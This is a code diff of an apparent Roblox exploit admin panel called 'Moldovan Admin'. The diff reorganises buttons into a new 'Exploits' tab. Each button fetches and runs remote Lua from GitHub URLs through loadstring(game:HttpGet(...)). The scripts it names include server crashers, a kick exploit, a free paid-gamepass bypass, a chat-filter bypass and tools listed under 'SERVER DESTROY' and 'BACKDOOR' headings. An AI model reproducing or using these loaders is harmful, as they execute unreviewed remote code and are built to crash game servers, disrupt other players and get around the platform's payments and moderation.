@@ -16,6 +16,7 @@ local Luxt = Luxtl.CreateWindow("Moldovan Admin", "v2.0 beta")
 local utilTab = Luxt:Tab("🧠 Utility")
 local visualTab = Luxt:Tab("👁️ Visual")
 local trollTab = Luxt:Tab("👻 Trolling")
+local exploitTab = Luxt:Tab("☄️ Exploits")
 local moveTab = Luxt:Tab("💨 Movement")
 local miscTab = Luxt:Tab("🔧 Misc")
 local creditsTab = Luxt:Tab("📜 Credits")
@@ -186,10 +187,6 @@ utilSec:Button("Remove Gameasses", [[
 
 utilSec:Button("Free Gameasses", [[
     loadstring(game:HttpGet("https://gist.githubusercontent.com/dark-modz/6982de484735e730494b2d5a10fd6a2a/raw/a92563b0cd6a63683341a09f54baccea5349ed69/feGamepassV2",true))()
-]])
-
-utilSec:Button("Free Dev Gameasses", [[
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/free-dev-gamepass.lua"))()
 ]])
 
 utilSec:Button("Keyboard", [[
@@ -375,10 +372,6 @@ visualSec:Button("Show network ownership", [[
 local trollSec = trollTab:Section("TROLLING")
 local flingSec = trollTab:Section("FLING")
 
-trollSec:Button("Ac6 FE Music", [[
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Roblox-HttpSpy/my-Garbage/refs/heads/main/FeMusicExploit.lua"))()
-]])
-
 trollSec:Button("Alkek Chat Bypass", [[
     loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/alkek-chat-bypass.lua"))()
 ]])
@@ -508,6 +501,78 @@ flingSec:Button("Tp to all(USE TOUCH FLING)", [[
 ]])
 
 
+-- ==== ☄️ EXPLOITS ====
+local exploitSec = exploitTab:Section("EXPLOITS")
+local unachoredSec = exploitTab:Section("UNANCHOR PARTS")
+local f3xSec = exploitTab:Section("F3X")
+exploitSec:Button("Ac6 FE Music", [[
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Roblox-HttpSpy/my-Garbage/refs/heads/main/FeMusicExploit.lua"))()
+]])
+
+exploitSec:Button("Free Dev Gameasses", [[
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/free-dev-gamepass.lua"))()
+]])
+
+exploitSec:Button("Kick Exploit", [[
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/kick-exploit.lua"))()
+]])
+
+exploitSec:Button("Crash Server with Tools", [[
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ALLAHSIZV0C0N456793/Hj/refs/heads/main/fe%20tool%20server%20crasher%20.txt"))()
+]])
+
+exploitSec:Button("Crash Server with Tools V2", [[
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/crash-with-tools-v2.lua"))()
+]])
+
+
+unachoredSec:Button("Super Ring Parts", [[
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/srp.lua"))()
+]])
+
+unachoredSec:Button("Super Ring Parts V6", [[
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/srp-v6.lua"))()
+]])
+
+unachoredSec:Button("Kawai Aura", [[
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/hellohellohell012321/KAWAII-AURA/main/kawaii_aura.lua", true))()
+    end)
+]])
+
+unachoredSec:Button("Black Hole", [[
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/black-hole.lua"))()
+]])
+
+unachoredSec:Button("Telekinesis", [[
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/telekinesis.lua"))()
+]])
+
+
+f3xSec:Button("F3X Remake", [[
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/f3xr.lua"))()
+]])
+
+f3xSec:Button("Blue2Spooky Revive", [[
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/blue2spooky.lua"))()
+]])
+
+f3xSec:Button("Blue2Spooky Remake", [[
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/b2sremake.lua"))()
+]])
+
+f3xSec:Button("Alkek", [[
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/alkek.lua", true))()
+]])
+
+f3xSec:Button("F3X Panel", [[
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/SkireScripts/F3X-Panel/main/Main.lua"))()
+]])
+
+f3xSec:Button("F3XSploit", [[
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/f3xsploit.lua"))()
+]])
+
 
 -- ==== 💨 MOVEMENT ====
 local moveSec = moveTab:Section("MOVEMENT")
@@ -553,60 +618,6 @@ moveSec:Button("Click TP", [[
 -- ==== 🔧 MISC ====
 local miscSec = miscTab:Section("SERVER DESTROY")
 local backdoorSec = miscTab:Section("BACKDOOR")
-
-miscSec:Button("Crash Server with Tools", [[
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/ALLAHSIZV0C0N456793/Hj/refs/heads/main/fe%20tool%20server%20crasher%20.txt"))()
-]])
-
-miscSec:Button("Crash Server with Tools V2", [[
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/crash-with-tools-v2.lua"))()
-]])
-
-miscSec:Button("F3X Remake", [[
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/f3xr.lua"))()
-]])
-
-miscSec:Button("Blue2Spooky Revive", [[
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/blue2spooky.lua"))()
-]])
-
-miscSec:Button("Blue2Spooky Remake", [[
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/b2sremake.lua"))()
-]])
-
-miscSec:Button("Alkek", [[
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/alkek.lua", true))()
-]])
-
-miscSec:Button("F3X Panel", [[
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/SkireScripts/F3X-Panel/main/Main.lua"))()
-]])
-
-miscSec:Button("F3XSploit", [[
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/f3xsploit.lua"))()
-]])
-
-miscSec:Button("Super Ring Parts", [[
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/srp.lua"))()
-]])
-
-miscSec:Button("Super Ring Parts V6", [[
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/srp-v6.lua"))()
-]])
-
-miscSec:Button("Kawai Aura", [[
-    pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/hellohellohell012321/KAWAII-AURA/main/kawaii_aura.lua", true))()
-    end)
-]])
-
-miscSec:Button("Black Hole", [[
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/black-hole.lua"))()
-]])
-
-miscSec:Button("Telekinesis", [[
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/telekinesis.lua"))()
-]])
 
 miscSec:Button("c00lgui", [[
     loadstring(game:GetObjects("rbxassetid://16742906657")[1].Source)()
